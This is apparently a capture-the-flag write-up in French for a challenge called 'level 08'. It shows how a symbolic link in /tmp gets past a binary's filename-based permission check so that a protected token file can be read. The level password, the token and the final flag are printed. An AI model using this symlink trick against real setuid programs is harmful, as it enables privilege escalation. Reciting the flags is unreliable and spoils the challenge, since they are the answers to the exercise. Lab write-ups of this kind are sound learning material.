# level 08

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
fiumuikeil55xe9cu4dood66h
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

Deux fichiers, level08 et token

level08 attend un fichier en paramètre, mais (via ltrace) on remarque que level08 check si on a les droits pour lire le fichier.

On crée un lien symbolique pour trick la vérification
```cmd
ln -s ~/token /tmp/wow
./level08 /tmp/wow
```
On récupère le flag
`quif5eloekouj29ke0vouxean`


```cmd
su flag08 quif5eloekouj29ke0vouxean
getflag
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
25749xKZ8L7DkSCwJkT9dyv6f
```